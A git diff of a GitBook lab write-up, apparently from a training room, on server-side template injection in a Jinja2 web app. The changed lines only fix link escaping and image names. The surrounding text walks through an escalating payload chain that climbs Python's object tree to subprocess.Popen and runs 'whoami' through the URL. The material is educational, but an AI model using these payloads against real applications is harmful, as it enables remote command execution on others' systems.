@@ -106,7 +106,7 @@ In the best case scenario, the error message will include the template engine, w
 
 However, if this is not the case, we can use a decision tree to help us identify the template engine:
 
-![](https://gblobscdn.gitbook.com/assets%2F-L\_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge\_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png)
+![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png)
 
 \
 To follow the decision tree, start at the very left and include the variable in your request. Follow the arrow depending on the output:
@@ -129,7 +129,7 @@ The application evaluates the user input, so we follow the green arrow.
 
 Continue with this process until you get to the end of the decision tree.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Syntax
 
@@ -194,11 +194,11 @@ Note: Jinja2 is essentially a sub language of Python that doesn't integrate the 
 
 ### Crafting a proof of concept (Jinja2)
 
-Python allows us to call the current class instance with [.\_\_class\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.\_\_class\_\_), we can call this on an empty string:
+Python allows us to call the current class instance with [.\_\_class\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__), we can call this on an empty string:
 
 Payload: `http://10.10.161.88:5000/profile/{{ ''.__class__ }}`.
 
-Classes in Python have an attribute called [.\_\_mro\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.\_\_mro\_\_) that allows us to climb up the inherited object tree:
+Classes in Python have an attribute called [.\_\_mro\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__) that allows us to climb up the inherited object tree:
 
 Payload: `http://10.10.161.88:5000/profile/{{ ''.__class__.__mro__ }}`.
 
@@ -206,7 +206,7 @@ Since we want the root object, we can access the second property (first index):
 
 Payload: `http://10.10.161.88:5000/profile/{{ ''.__class__.__mro__[1] }}`.
 
-Objects in Python have a method called [.\_\_subclassess\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.\_\_subclasses\_\_) that allows us to climb down the object tree:
+Objects in Python have a method called [.\_\_subclassess\_\_](https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__) that allows us to climb down the object tree:
 
 Payload: `http://10.10.161.88:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}`.
 
@@ -254,7 +254,7 @@ http://10.10.161.88:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}
 
 Now we need to find an object that allows us to run shell commands. Doing a Ctrl-F for the modules in the code above yields us a match:
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Browser**
 
@@ -262,7 +262,7 @@ Now we need to find an object that allows us to run shell commands. Doing a Ctrl
 </strong>ttp://10.10.161.88:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}
 </code></pre>
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Examination
 
